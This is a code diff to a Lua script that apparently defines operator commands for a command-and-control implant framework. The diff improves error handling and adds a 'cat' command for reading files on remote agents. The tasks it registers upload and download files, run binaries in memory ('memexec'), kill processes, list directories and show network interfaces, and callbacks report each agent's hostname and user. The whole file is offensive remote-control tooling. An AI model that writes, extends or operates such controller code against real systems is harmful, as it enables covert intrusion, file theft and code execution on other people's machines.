@@ -8,12 +8,17 @@ CODE = {
     PWD = 7,
     LS = 8,
     MEMEXEC = 9,
-    IFCONFIG = 10
+    IFCONFIG = 10,
+    CAT = 11
 }
 
 function ping(payload)
     lua_print("command ping from script args", payload, "\n")
-    local task_id = add_task(CODE.PING, payload)
+    local task_id, err = add_task(CODE.PING, payload)
+    if err then
+        lua_print("Error: " .. err)
+        return
+    end
     
     -- Register a callback for this specific task
     register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
@@ -26,18 +31,18 @@ function ping(payload)
 end
 
 function ssh(payload)
-    print("command ssh from script with args", payload)
-    local err = add_task(CODE.SSH, payload)
+    local task_id, err = add_task(CODE.SSH, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function download(payload)
-    print("command download from script with args", payload)
-    local err = add_task(CODE.DOWN, payload)
+    local task_id, err = add_task(CODE.DOWN, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
@@ -49,13 +54,14 @@ function upload(payload)
         c=c+1
     end
     if #lcs ~= 1 then
-        print("problem")
+        lua_print("Usage: upload <source_path> <dest_path>")
         return
     end
 
-    local err = add_task_upload_file(CODE.UPL, lcs[0], lcs[1])
+    local task_id, err = add_task_upload_file(CODE.UPL, lcs[0], lcs[1])
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
@@ -66,43 +72,47 @@ function upload2(payload)
         opts[k] = v
     end
 
-    if not t.s or not t.d then
-        print("problem")
+    if not opts.s or not opts.d then
+        lua_print("Usage: upload2 s=<source_path> d=<dest_path>")
         return
     end
 
-    local err = add_task_upload_file(CODE.UPL, opts.s, opts.d)
+    local task_id, err = add_task_upload_file(CODE.UPL, opts.s, opts.d)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function kill(payload)
-    print("command kill from script with args", payload)
-    local err = add_task(CODE.KILL, payload)
+    local task_id, err = add_task(CODE.KILL, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function pwd(payload)
-    local err = add_task(CODE.PWD, payload)
+    local task_id, err = add_task(CODE.PWD, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function cd(payload)
-    local err = add_task(CODE.CD, payload)
+    local task_id, err = add_task(CODE.CD, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function ls(payload)
-    local err = add_task(CODE.LS, payload)
+    local task_id, err = add_task(CODE.LS, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
@@ -114,20 +124,30 @@ function memexec(payload)
         c=c+1
     end
     if #lcs ~= 1 then
-        print("problem")
+        lua_print("Usage: memexec <binary_path> <args>")
         return
     end
 
-    local err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
+    local task_id, err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
     end
 end
 
 function ifconfig(payload)
-    local err = add_task(CODE.IFCONFIG, payload)
+    local task_id, err = add_task(CODE.IFCONFIG, payload)
     if err then
-        print("Error")
+        lua_print("Error: " .. err)
+        return
+    end
+end
+
+function cat(payload)
+    local task_id, err = add_task(CODE.CAT, payload)
+    if err then
+        lua_print("Error: " .. err)
+        return
     end
 end
 
@@ -164,6 +184,7 @@ command("impl","cd","Change dir", cd)
 command("impl","ls","List dir", ls)
 command("impl","memexec","Execute binary in memory", memexec)
 command("impl","ifconfig","Display network interfaces", ifconfig)
+command("impl","cat","Display file contents (first 10KB)", cat)
 
 --[[
 function OnRegister(...)
